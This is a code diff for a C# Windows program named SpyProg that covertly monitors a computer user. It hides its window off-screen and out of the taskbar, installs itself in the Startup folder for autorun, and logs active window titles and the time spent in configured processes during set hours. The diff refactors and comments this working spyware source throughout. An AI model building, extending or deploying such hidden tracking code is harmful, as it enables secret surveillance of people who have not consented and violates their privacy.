@@ -4,36 +4,43 @@ using System.Windows.Forms;
 using System.IO;
 using System.Linq;
 using IWshRuntimeLibrary;
+using SpyProg.Loggers;
 
 namespace SpyProg {
     public partial class Form1 : Form {
-        private string currWindow = "";
-        private string prevWindow = "";
-        private bool lastSaveFlag = false;
-
-        private string spyFilePath;
+        //current active user's window
+        private string currentWindow = "";
+        //previous active user's window
+        private string previousWindow = "";
+        //flag for spying time restriction
+        private bool isNewSession = true;
 
         private readonly Config config;
 
-        private Dictionary<string, string> procDict = new Dictionary<string, string>();
+        //dictionary contains Config's processes(key) and time, spending in it(value)
+        private Dictionary<string, string> processDictionary = new Dictionary<string, string>();
+        //time of user's activity in tracking process
         private DateTime actTime = DateTime.MinValue;
+
+        private SessionSpyLogger sessionLogger;
+        private DaySpyLogger dayLogger;
+        private ErrorLogger errorLogger;
 
         public Form1() {
             InitializeComponent();
-            this.Load += new System.EventHandler(this.OnFormLoad);
+            this.Load += HideForm;
             CreateShortcut();
-
-            spyFilePath = NewFilePath;
 
             config = new Config();
             config.SerializeConfig();
+
+            sessionLogger = new SessionSpyLogger();
+            dayLogger = new DaySpyLogger();
+            errorLogger = new ErrorLogger();
         }
 
-        private string NewFilePath => Path.Combine(AppDomain.CurrentDomain.BaseDirectory, $"spyFile({DateTime.Now.ToString("dd-MM-yyyy_HH-mm-ss")}).txt");
-        private string NewAbsSpyFilePath => Path.Combine(AppDomain.CurrentDomain.BaseDirectory, $"absoluteSpyFile({DateTime.Now.ToString("dd-MM-yyyy")}).txt");
-
         // hide application from user
-        private void OnFormLoad(object sender, EventArgs e) {
+        private void HideForm(object sender, EventArgs e) {
             Form form = (Form)sender;
             form.ShowInTaskbar = false;
             form.Location = new System.Drawing.Point(-10000, -10000);
@@ -41,74 +48,84 @@ namespace SpyProg {
 
         private void spyTimer_Tick(object sender, EventArgs e) {
             try {
-                if (TimeRestrict) {
-                    if (!lastSaveFlag) {
-                        lastSaveFlag = true;
-                        spyFilePath = NewFilePath;
-                        procDict = new Dictionary<string, string>();
+                if (IsSpyingTime) {
+                    if (isNewSession) {
+                        NewSpyingSession();
                     }
 
-                    currWindow = WinApi.GetActiveWindowName();
-                    SaveAbsoluteInfo();
-
-                    string currProc = ProcRestrict(currWindow);
-                    string prevProc = ProcRestrict(prevWindow);
-
-                    if (currWindow != prevWindow && prevProc != null) {
-                        SaveSpyInfo(prevProc);
+                    currentWindow = WinApi.GetActiveWindowName();
+                    //if active window is change - log
+                    if (currentWindow != previousWindow && !string.IsNullOrEmpty(currentWindow)) {
+                        dayLogger.Log(currentWindow);
                     }
 
-                    if (currWindow != prevWindow && currProc != null) {
+                    //check if windows must be tracked (contains in Config's processes)
+                    string currentProcess = ProcessNameComparison(currentWindow);
+                    string previousProcess = ProcessNameComparison(previousWindow);
+
+                    //if tracking processes change - log
+                    if (currentWindow != previousWindow && previousProcess != null) {
+                        SaveTrackingProcessInfo(previousProcess);
+                    }
+
+                    //if user activate new tracking process - reset actTime
+                    if (currentWindow != previousWindow && currentProcess != null) {
                         actTime = DateTime.Now;
                     }
-                    prevWindow = currWindow;
+                    previousWindow = currentWindow;
 
                     return;
                 }
 
-                if (lastSaveFlag) {
-                    string currProc = ProcRestrict(currWindow);
-                    if (currProc != null)
-                        SaveSpyInfo(currProc);
-
-                    SaveAbsoluteInfo();
-                    currWindow = "";
-                    prevWindow = "";
-                    spyFilePath = "";
-                    lastSaveFlag = false;
+                if (!isNewSession) {
+                    SpyingSessionIsOver();
                 }
             }
-            catch { }
+            catch(Exception ex) {
+                errorLogger.Log(ex);
+            }
         }
 
-        private bool TimeRestrict => DateTime.Now >= config.ActStartTime && DateTime.Now < config.ActEndTime;
-        private string ProcRestrict(string procName) => config.Processes.FirstOrDefault(p => procName.ToLower().Contains(p.ToLower()));
+        //spying time is restricted in Config file
+        private bool IsSpyingTime => DateTime.Now >= config.ActStartTime && DateTime.Now < config.ActEndTime;
 
-        private void SaveSpyInfo(string procName) {
+        //if window name contains name of tracking process - return window name, otherwise null
+        private string ProcessNameComparison(string procName) => config.Processes.FirstOrDefault(p => procName.ToLower().Contains(p.ToLower()));
+
+        private void NewSpyingSession() {
+            isNewSession = false;
+            sessionLogger.NewSession();
+            processDictionary = new Dictionary<string, string>();
+        }
+
+        private void SpyingSessionIsOver() {
+            string currentProcess = ProcessNameComparison(currentWindow);
+            if (currentProcess != null)
+                SaveTrackingProcessInfo(currentProcess);
+
+            if (currentWindow != previousWindow) {
+                dayLogger.Log(currentWindow);
+            }
+
+            currentWindow = "";
+            previousWindow = "";
+            isNewSession = true;
+        }
+
+        private void SaveTrackingProcessInfo(string processName) {
             TimeSpan timeSpan = DateTime.Now - actTime;
 
-            if (procDict.ContainsKey(procName)) {
-                procDict[procName] = (DateTime.Parse(procDict[procName]) + timeSpan).ToString("HH:mm:ss");
+            //tracking time that user spent in process
+            if (processDictionary.ContainsKey(processName)) {
+                processDictionary[processName] = (DateTime.Parse(processDictionary[processName]) + timeSpan).ToString("HH:mm:ss");
             }
             else
-                procDict.Add(procName, (new DateTime(timeSpan.Ticks)).ToString("HH:mm:ss"));
+                processDictionary.Add(processName, (new DateTime(timeSpan.Ticks)).ToString("HH:mm:ss"));
 
-            using (StreamWriter sw = new StreamWriter(spyFilePath, false)) {
-                foreach (var p in procDict) {
-                    sw.WriteLine($"{p.Key} - {p.Value}");
-                }
-            }
+            sessionLogger.Log(processDictionary);
         }
 
-        private void SaveAbsoluteInfo() {
-            if(!string.IsNullOrEmpty(currWindow) && prevWindow != currWindow) {
-                using (StreamWriter sw = System.IO.File.AppendText(NewAbsSpyFilePath)) {
-                    sw.WriteLine($"{DateTime.Now.ToString("HH:mm:ss")} - {currWindow}");
-                }
-            }
-        }
-
-        // autorun shortcut
+        //create autorun shortcut
         private void CreateShortcut() {
             var path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "SpyProg.lnk");
             if (!System.IO.File.Exists(path)) {
